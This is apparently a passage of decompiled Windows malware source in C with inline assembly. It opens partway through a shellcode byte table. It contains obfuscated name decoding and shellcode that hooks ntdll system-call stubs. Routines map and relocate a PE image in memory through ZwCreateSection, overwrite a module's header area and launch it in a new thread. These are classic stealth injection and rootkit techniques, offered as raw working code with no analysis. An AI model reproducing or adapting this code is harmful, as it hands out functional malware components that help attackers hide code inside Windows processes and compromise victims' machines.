0x51, 0x81, 0xC1, 0x18, 0x00, 0x00, 0x00, 0xE8, 0xBF, 0x02, 0x00, 0x00, 0x59, 0xC3};

A_TEXT const char NTDLL_TABLE2[915] = {0x5A, 0x84, 0xD2, 0x74, 0x25, 0xFE, 0xCA, 0x0F, 0x84, 0x82, 0x00, 0x00, 0x00, 0xFE, 0xCA, 0x0F,
0x84, 0xBB, 0x00, 0x00, 0x00, 0xFE, 0xCA, 0x0F, 0x84, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0xCA, 0x0F,
0x84, 0x40, 0x01, 0x00, 0x00, 0xE9, 0x8C, 0x01, 0x00, 0x00, 0xE8, 0xF9, 0x01, 0x00, 0x00, 0x85,
0xD2, 0x74, 0x13, 0x52, 0x8B, 0x52, 0x08, 0x3B, 0x54, 0x24, 0x0C, 0x75, 0x08, 0xC7, 0x44, 0x24,
0x30, 0x40, 0x00, 0x00, 0x00, 0x5A, 0x52, 0xE8, 0x1E, 0x02, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00,
0x75, 0x09, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08,
0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x23, 0xE8, 0xB8, 0x01, 0x00, 0x00,
0x85, 0xD2, 0x74, 0x18, 0x8B, 0x52, 0x08, 0x3B, 0x54, 0x24, 0x08, 0x75, 0x0F, 0x8B, 0x54, 0x24,
0x10, 0x52, 0xE8, 0xA1, 0x01, 0x00, 0x00, 0x8B, 0x52, 0x0C, 0xFF, 0xD2, 0x33, 0xC0, 0xC3, 0x81,
0x7C, 0x24, 0x20, 0xAE, 0x82, 0x19, 0xAE, 0x75, 0x15, 0xE8, 0x8A, 0x01, 0x00, 0x00, 0x85, 0xD2,
0x74, 0x0C, 0x8B, 0x52, 0x08, 0x8B, 0x44, 0x24, 0x08, 0x89, 0x10, 0x33, 0xC0, 0xC3, 0x52, 0xE8,
0xB6, 0x01, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00, 0x75, 0x09, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD,
0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00, 0xC3,
0xE8, 0x53, 0x01, 0x00, 0x00, 0x85, 0xD2, 0x74, 0x20, 0x50, 0x57, 0x8B, 0x7C, 0x24, 0x18, 0xE8,
0x93, 0x01, 0x00, 0x00, 0x8B, 0xD0, 0x5F, 0x58, 0x85, 0xD2, 0x74, 0x0D, 0x8B, 0x44, 0x24, 0x08,
0xC7, 0x00, 0xAE, 0x82, 0x19, 0xAE, 0x33, 0xC0, 0xC3, 0x52, 0xE8, 0x6B, 0x01, 0x00, 0x00, 0x83,
0x7A, 0x04, 0x00, 0x75, 0x09, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D,
0x54, 0x24, 0x08, 0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00, 0xC3, 0x81, 0x7C, 0x24, 0x08, 0xAE,
0x82, 0x19, 0xAE, 0x75, 0x03, 0x33, 0xC0, 0xC3, 0xE8, 0xFB, 0x00, 0x00, 0x00, 0x85, 0xD2, 0x74,
0x12, 0x50, 0x8B, 0x44, 0x24, 0x0C, 0x39, 0x42, 0x08, 0x75, 0x07, 0xC7, 0x42, 0x08, 0x00, 0x00,
0x00, 0x00, 0x58, 0x52, 0xE8, 0x21, 0x01, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00, 0x75, 0x09, 0x5A,
0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0x64, 0xFF, 0x15,
0xC0, 0x00, 0x00, 0x00, 0xC3, 0xE8, 0xBE, 0x00, 0x00, 0x00, 0x85, 0xD2, 0x74, 0x26, 0x50, 0x52,
0x57, 0x8B, 0x7C, 0x24, 0x14, 0xE8, 0xFD, 0x00, 0x00, 0x00, 0x5F, 0x5A, 0x85, 0xC0, 0x74, 0x13,
0x58, 0x85, 0xD2, 0x74, 0x0B, 0x8B, 0x54, 0x24, 0x0C, 0xC7, 0x42, 0x20, 0x80, 0x00, 0x00, 0x00,
0x33, 0xC0, 0xC3, 0x58, 0x52, 0xE8, 0xD0, 0x00, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00, 0x75, 0x09,
0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0x64, 0xFF,
0x15, 0xC0, 0x00, 0x00, 0x00, 0xC3, 0xE8, 0x6D, 0x00, 0x00, 0x00, 0x85, 0xD2, 0x52, 0x74, 0x45,
0x8B, 0x52, 0x08, 0x3B, 0x54, 0x24, 0x0C, 0x75, 0x3C, 0x83, 0x7C, 0x24, 0x10, 0x01, 0x75, 0x35,
0x83, 0x7C, 0x24, 0x18, 0x30, 0x7C, 0x27, 0x5A, 0x51, 0x56, 0x57, 0x8D, 0x72, 0x50, 0x8B, 0x7C,
0x24, 0x1C, 0xB9, 0x30, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x5F, 0x5E, 0x59, 0x8B, 0x44, 0x24, 0x18,
0x83, 0xF8, 0x00, 0x74, 0x06, 0xC7, 0x00, 0x30, 0x00, 0x00, 0x00, 0x33, 0xC0, 0xC3, 0x5A, 0xB8,
0x0D, 0x00, 0x00, 0xC0, 0xC3, 0x5A, 0x52, 0xE8, 0x5E, 0x00, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00,
0x75, 0x09, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08,
0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00, 0xC3, 0x50, 0x56, 0x57, 0x51, 0x52, 0x83, 0xEC, 0x1C,
0x8B, 0xC4, 0x6A, 0x1C, 0x50, 0x54, 0xE8, 0x2F, 0x00, 0x00, 0x00, 0xFF, 0x52, 0x0C, 0x8B, 0x3C,
0x24, 0x03, 0x7C, 0x24, 0x0C, 0x83, 0xC4, 0x1C, 0x5A, 0x59, 0x8B, 0xF4, 0x3B, 0xF7, 0x73, 0x12,
0xAD, 0x35, 0xDD, 0x79, 0x19, 0xAE, 0x8D, 0x40, 0x04, 0x3B, 0xC6, 0x75, 0xEF, 0x8D, 0x46, 0xFC,
0xEB, 0x02, 0x33, 0xC0, 0x8B, 0xD0, 0x5F, 0x5E, 0x58, 0xC3, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5A,
0x81, 0xC2, 0x24, 0x01, 0x00, 0x00, 0xC3, 0x53, 0x51, 0x52, 0x57, 0x83, 0xFF, 0x00, 0x74, 0x36,
0x8B, 0x7F, 0x08, 0x83, 0xFF, 0x00, 0x74, 0x2E, 0x0F, 0xB7, 0x1F, 0x8B, 0x7F, 0x04, 0x8D, 0x5C,
0x1F, 0x02, 0x8D, 0x5B, 0xFE, 0x3B, 0xDF, 0x7E, 0x1D, 0x66, 0x83, 0x7B, 0xFE, 0x5C, 0x75, 0xF2,
0x52, 0x53, 0x8D, 0x5A, 0x10, 0x53, 0xE8, 0xBF, 0xFF, 0xFF, 0xFF, 0xFF, 0x52, 0x08, 0x5A, 0x85,
0xC0, 0x75, 0x03, 0x40, 0xEB, 0x02, 0x33, 0xC0, 0x5F, 0x5A, 0x59, 0x5B, 0xC3, 0x50, 0x51, 0x52,
0xE8, 0xA5, 0xFF, 0xFF, 0xFF, 0xC7, 0x42, 0x04, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x32, 0xFF, 0x52,
0x14, 0x59, 0x85, 0xC0, 0x0F, 0x84, 0xB7, 0x00, 0x00, 0x00, 0x50, 0x51, 0x50, 0x54, 0x68, 0x80,
0x00, 0x00, 0x00, 0x6A, 0x18, 0x50, 0xE8, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0x52, 0x10, 0x5A, 0x8B,
0xD0, 0x59, 0x58, 0x85, 0xD2, 0x0F, 0x84, 0x96, 0x00, 0x00, 0x00, 0x80, 0x38, 0xB8, 0x0F, 0x85,
0x8D, 0x00, 0x00, 0x00, 0x80, 0x78, 0x05, 0xBA, 0x74, 0x70, 0x81, 0x78, 0x05, 0x8D, 0x54, 0x24,
0x04, 0x75, 0x1B, 0x81, 0x78, 0x08, 0x04, 0xCD, 0x2E, 0xC2, 0x75, 0x75, 0x2B, 0xC8, 0x83, 0xE9,
0x0A, 0x89, 0x48, 0x06, 0xC6, 0x40, 0x05, 0xE8, 0xC6, 0x40, 0x0A, 0x90, 0xEB, 0x63, 0x81, 0x78,
0x07, 0x8D, 0x54, 0x24, 0x04, 0x75, 0x5A, 0x81, 0x78, 0x0B, 0x64, 0xFF, 0x15, 0xC0, 0x75, 0x51,
0x81, 0x78, 0x0F, 0x00, 0x00, 0x00, 0xC2, 0x75, 0x48, 0x52, 0xE8, 0x1B, 0xFF, 0xFF, 0xFF, 0xC7,
0x42, 0x04, 0x01, 0x00, 0x00, 0x00, 0x5A, 0x56, 0x50, 0x53, 0x51, 0x52, 0x8B, 0xF0, 0x8B, 0x46,
0x0A, 0x8B, 0x56, 0x0E, 0x2B, 0xCE, 0x83, 0xE9, 0x12, 0xBB, 0x04, 0x90, 0x90, 0xE8, 0xF0, 0x0F,
0xC7, 0x4E, 0x0A, 0x5A, 0x59, 0x5B, 0x58, 0x5E, 0xEB, 0x17, 0x66, 0x81, 0x78, 0x0A, 0xFF, 0xD2,
0x74, 0x0C, 0x66, 0x81, 0x78, 0x0A, 0xFF, 0x12, 0x75, 0x07, 0xC6, 0x40, 0x0B, 0xD2, 0x89, 0x48,
0x06, 0x58, 0xC3};


A_TEXT const HMODULE NTDLL_DLL = 0;
A_TEXT const HMODULE EMPTY_PTR = 0;

A_TEXT const _tlstrcmpiW             _lstrcmpiW             = 0;
A_TEXT const _tVirtualQuery          _VirtualQuery          = 0;
A_TEXT const _tVirtualProtect        _VirtualProtect        = 0;
A_TEXT const _tGetProcAddress        _GetProcAddress        = 0;
A_TEXT const _tMapViewOfFile         _MapViewOfFile         = 0;
A_TEXT const _tUnmapViewOfFile       _UnmapViewOfFile       = 0;
A_TEXT const _tFlushInstructionCache _FlushInstructionCache = 0;
A_TEXT const _tLoadLibraryW          _LoadLibraryW          = 0;
A_TEXT const _tFreeLibrary           _FreeLibrary           = 0;
A_TEXT const _tZwCreateSection       _ZwCreateSection       = 0;
A_TEXT const _tZwMapViewOfSection    _ZwMapViewOfSection    = 0;
A_TEXT const _tCreateThread          _CreateThread          = 0;
A_TEXT const _tWaitForSingleObject   _WaitForSingleObject   = 0;
A_TEXT const _tGetExitCodeThread     _GetExitCodeThread     = 0;
A_TEXT const _tZwClose               _ZwClose               = 0;

void DecodeModuleNameA(const char *pEncodedFunctionName, char *pDecodedFunctionName)
{
	if(!pEncodedFunctionName)
	{
		*pDecodedFunctionName = 0;
		return;
	}
	
	for(; ; pDecodedFunctionName++, pEncodedFunctionName += 2)
	{
		*pDecodedFunctionName = *pEncodedFunctionName ^ 0x12;
		if(*pEncodedFunctionName == 0x12) break;
	}
}

void DecodeModuleNameW(const WCHAR *pEncodedModuleName, WCHAR *pDecodedModuleName)
{
	if(!pEncodedModuleName)
	{
		*pDecodedModuleName = 0;
		return;
	}
	
	for(; ; pEncodedModuleName++, pDecodedModuleName++)
	{
		*pDecodedModuleName = *pEncodedModuleName ^ 0xAE12;
		if(*pEncodedModuleName == 0xAE12) break;
	}
}

HMODULE GetModuleNTDLL(void)
{
	WCHAR ModuleName[100]; // [sp+0h] [bp-C8h]@1

	DecodeModuleNameW(ENCODED_NTDLL_DLL, ModuleName);
	return GetModuleHandleW(ModuleName);
}

FARPROC GetFunctionFromModule(const WCHAR *pEncodedModuleName, const char *pEncodedFunctionName)
{
	WCHAR pDecodedModuleName[100]; // [sp+0h] [bp-12Ch]@1
	CHAR ProcName[100]; // [sp+C8h] [bp-64h]@1

	DecodeModuleNameW(pEncodedModuleName, pDecodedModuleName);
	DecodeModuleNameA(pEncodedFunctionName, ProcName);
	
	return GetProcAddress(GetModuleHandleW(pDecodedModuleName), ProcName);
}

__declspec(naked) void __memcpy(void *pDestination, const void *pSource, size_t iSize)
{
	__asm {
		push    ebp
		mov     ebp, esp
		push    esi
		push    edi
		mov     edi, pDestination
		mov     esi, pSource
		mov     ecx, iSize
		rep movsb
		pop     edi
		pop     esi
		pop     ebp
		retn
	}
}

FARPROC GetFunctionFromKERNEL32(const char *pEncodedFunctionName)
{
	return GetFunctionFromModule(ENCODED_KERNEL32_DLL, pEncodedFunctionName);
}

FARPROC GetFunctionFromNTDLL(const char *pEncodedFunctionName)
{
	return GetFunctionFromModule(ENCODED_NTDLL_DLL, pEncodedFunctionName);
}

signed int NTDLL_CODE_SHELLCODE_INIT(int a1)
{
	int v2; // [sp+0h] [bp-98h]@8
	int v3; // [sp+4h] [bp-94h]@5
	unsigned int v4; // [sp+8h] [bp-90h]@11
	int v5; // [sp+Ch] [bp-8Ch]@1
	int v6; // [sp+10h] [bp-88h]@1
	int v7; // [sp+14h] [bp-84h]@1
	unsigned int v8[32]; // [sp+18h] [bp-80h]@1

	v6 = *(_DWORD *)(a1 + 32);
	v7 = (char *)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - NTDLL_TABLE;
	
	NTDLL_CODE_SHELLCODE_FUNC4(v8, (const void *)v6, 128);
	
	v8[0] = (unsigned int)v8 ^ 0xAE1979DD;
	v8[1] = 0;
	v8[3] = *(_DWORD *)(a1 + 4);
	
	v5 = NTDLL_CODE_SHELLCODE_FUNC7(v7, (int)v8, *(const void **)(v6 + 140), *(_DWORD *)(v6 + 144));
	if(v5) return v5;
	
	v5 = NTDLL_CODE_SHELLCODE_FUNC6(a1, v7);
	if(v5)return -4;
	
	v3 = (*(int (__stdcall **)(unsigned int *))(v7 + 36))(&v8[4]);
	if(!v3) return -9;
	
	*(_DWORD *)(v6 + 128) = v3;
	if(*(_DWORD *)(v6 + 148) != -1)
	{
		v2 = (*(int (__stdcall **)(_DWORD, signed int, _DWORD, int, _DWORD, _DWORD))(v7 + 52))(
					 0,
					 524288,
					 *(_DWORD *)a1,
					 a1,
					 0,
					 0);
		if(!v2)
			return -13;
		(*(void (__stdcall **)(int, signed int))(v7 + 56))(v2, -1);
		(*(void (__stdcall **)(int, int *))(v7 + 60))(v2, &v5);
	}
	
	v4 = v8[2];
	if(v8[2])
	{
		v8[2] = 0;
		(*(void (__stdcall **)(unsigned int))(v7 + 64))(v4);
	}
	
	(*(void (__stdcall **)(int))(v7 + 28))(v6);
	return v5;
}

int __stdcall NTDLL_CODE_SHELLCODE_FUNC1(int a1)
{
	int v2; // [sp+0h] [bp-Ch]@1
	int v3; // [sp+4h] [bp-8h]@1
	unsigned int v4; // [sp+8h] [bp-4h]@1

	v3 = *(_DWORD *)(a1 + 32);
	v4 = (char *)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - NTDLL_TABLE;
	v2 = (*(int (__stdcall **)(_DWORD, _DWORD))(v4 + 20))(*(_DWORD *)(v3 + 128), *(_DWORD *)(v3 + 148));
	
	if(v2)
	{
		((void (*)(_DWORD, _DWORD))v2)(*(_DWORD *)(v3 + 132), *(_DWORD *)(v3 + 136));
		return 0;
	}
	
	(*(void (__stdcall **)(_DWORD))(v4 + 40))(*(_DWORD *)(v3 + 128));
	return 0;
}

void NTDLL_CODE_SHELLCODE_FUNC2(_DWORD a1, _DWORD a2, _DWORD a3)
{
	*(_DWORD *)(a1 + 80) = *(_DWORD *)(a2 + 40) + *(_DWORD *)(a2 + 52);
	*(_DWORD *)(a1 + 84) = 0;
	*(_DWORD *)(a1 + 88) = *(_DWORD *)(a2 + 96);
	*(_DWORD *)(a1 + 92) = *(_DWORD *)(a2 + 100);
	*(_DWORD *)(a1 + 96) = *(_WORD *)(a2 + 92);
	*(_WORD *)(a1 + 100) = *(_WORD *)(a2 + 74);
	*(_WORD *)(a1 + 102) = *(_WORD *)(a2 + 72);
	*(_DWORD *)(a1 + 104) = 0;
	*(_WORD *)(a1 + 108) = *(_WORD *)(a2 + 22);
	*(_WORD *)(a1 + 110) = *(_WORD *)(a2 + 94);
	*(_WORD *)(a1 + 112) = *(_WORD *)(a2 + 4);
	*(_BYTE *)(a1 + 114) = 1;
	*(_BYTE *)(a1 + 115) = 4;
	*(_DWORD *)(a1 + 116) = *(_DWORD *)(a2 + 112);
	*(_DWORD *)(a1 + 120) = a3;
	*(_DWORD *)(a1 + 124) = 0;
}

signed int __stdcall NTDLL_CODE_SHELLCODE_FUNC3(int a1)
{
	int v2; // ST08_4@20
	int v3; // [sp+8h] [bp-24h]@12
	unsigned int v4; // [sp+Ch] [bp-20h]@12
	unsigned int j; // [sp+10h] [bp-1Ch]@14
	int v6; // [sp+18h] [bp-14h]@6
	int v7; // [sp+1Ch] [bp-10h]@6
	int v8; // [sp+24h] [bp-8h]@4
	int i; // [sp+28h] [bp-4h]@10

	if(!a1 || !*(_DWORD *)a1) return 0xC0000005;
	
	v8 = *(_DWORD *)a1;
	if(**(_WORD **)a1 != 0x5A4D) return 0xC0000005; // MZ header
	
	v6 = *(_DWORD *)(*(_DWORD *)a1 + 60) + v8;
	v7 = v8 - *(_DWORD *)(v6 + 52);
	
	if(v8 == *(_DWORD *)(v6 + 52)) return 0;
	
	*(_DWORD *)(v6 + 52) = v8;
	if(!*(_DWORD *)(v6 + 164)) return 0xC0000018;
	
	for(i = *(_DWORD *)(v6 + 160) + v8; *(_DWORD *)(i + 4); i += *(_DWORD *)(i + 4))
	{
		v4 = *(_DWORD *)(i + 4) - 8;
		v3 = i + 8;
		
		if(v4 % 2) return 0xC0000018;
		
		for(j = 0; j < v4 >> 1; ++j)
		{
			if((unsigned __int8)(*(_WORD *)v3 >> 8) >> 4)
			{
				if((unsigned __int8)(*(_WORD *)v3 >> 8) >> 4 != 3)return 0xC0000018;
				
				v2 = (*(_WORD *)v3 & 0xFFF) + *(_DWORD *)i + v8;
				*(_DWORD *)v2 += v7;
			}
			
			v3 += 2;
		}
	}
	
	return 0;
}

__declspec(naked) void NTDLL_CODE_SHELLCODE_FUNC4(void *pDestination, const void *pSource, unsigned int iSize)
{
	__asm {
		push    ebp
		mov     ebp, esp
		push    esi
		push    edi
		mov     edi, pDestination
		mov     esi, pSource
		mov     ecx, iSize
		rep movsb
		pop     edi
		pop     esi
		pop     ebp
		retn
	}
}

void NTDLL_CODE_SHELLCODE_FUNC5(const void *a1, int a2, void *a3)
{
	int v4; // [sp+0h] [bp-Ch]@1
	int v5; // [sp+4h] [bp-8h]@1
	int v6; // [sp+8h] [bp-4h]@1

	v4 = *(_WORD *)(a2 + 6);
	NTDLL_CODE_SHELLCODE_FUNC4(a3, a1, *(_DWORD *)(a2 + 84));
	v5 = a2 + *(_WORD *)(a2 + 20) + 24;
	v6 = 0;
	
	while(1)
	{
		if(v6 >= v4) break;
		
		if(*(_DWORD *)(v5 + 16))
			NTDLL_CODE_SHELLCODE_FUNC4((char *)a3 + *(_DWORD *)(v5 + 12), (char *)a1 + *(_DWORD *)(v5 + 20),*(_DWORD *)(v5 + 16));
		
		++v6;
		v5 += 40;
	}
}

_DWORD NTDLL_CODE_SHELLCODE_FUNC6(_DWORD a1, _DWORD a2)
{
	int v3; // [sp+8h] [bp-Ch]@1
	void *v4; // [sp+Ch] [bp-8h]@3
	char v5; // [sp+10h] [bp-4h]@5

	v3 = *(_DWORD *)a2;
	if(!*(_DWORD *)a2) return 0;
	
	v4 = (void *)(v3 + 64);
	if(*(_DWORD *)(v3 + 64) == 0xAB49103B) return 0;
	
	if((*(int (__stdcall **)(int, signed int, signed int, char *))(a2 + 16))(v3, 4096, 128, &v5))
	{
		NTDLL_CODE_SHELLCODE_FUNC4(v4, *(const void **)(a1 + 24), *(_DWORD *)(a1 + 28));
		(*(void (__thiscall **)(void *))(a1 + 8))(v4);
		(*(void (__stdcall **)(signed int, _DWORD, _DWORD))(a2 + 32))(-1, 0, 0);
		
		return 0;
	}
	
	return -4;
}

int NTDLL_CODE_SHELLCODE_FUNC7(int a1, int a2, const void *a3, int a4)
{
	int v5; // [sp+0h] [bp-1Ch]@3
	int v6; // [sp+4h] [bp-18h]@5
	int v7; // [sp+8h] [bp-14h]@5
	int v8; // [sp+Ch] [bp-10h]@5
	int v9; // [sp+10h] [bp-Ch]@7
	int v10; // [sp+14h] [bp-8h]@5
	const void *v11; // [sp+18h] [bp-4h]@1

	*(_DWORD *)(a2 + 8) = 0;
	v11 = a3;
	
	if(*(_WORD *)a3 != MZ_HEADER) return -2;
	
	v5 = (int)((char *)a3 + *((_DWORD *)v11 + 15));
	if(*(_DWORD *)v5 != PE_HEADER) return -2;
	
	v6 = *(_DWORD *)(v5 + 80);
	v7 = 0;
	
	v8 = (*(int (__stdcall **)(int *, signed int, _DWORD, int *, signed int, signed int, _DWORD))(a1 + 44))(&v10, 983071, 0, &v6, 64, 134217728, 0);
	if(v8) return -11;
	
	v9 = (*(int (__stdcall **)(int, signed int, _DWORD, _DWORD, _DWORD))(a1 + 24))(v10, 6, 0, 0, 0);
	if(!v9)
	{
			(*(void (__stdcall **)(int))(a1 + 64))(v10);
		return -10;
	}
	
	*(_DWORD *)(a2 + 8) = v10;
	NTDLL_CODE_SHELLCODE_FUNC5(a3, v5, (void *)v9);
	NTDLL_CODE_SHELLCODE_FUNC2(a2, v5, a4);
	(*(void (__stdcall **)(int))(a1 + 28))(v9);
	
	return 0;
}

void NTDLL_CODE_SHELLCODE_END(void)
{
	;
}
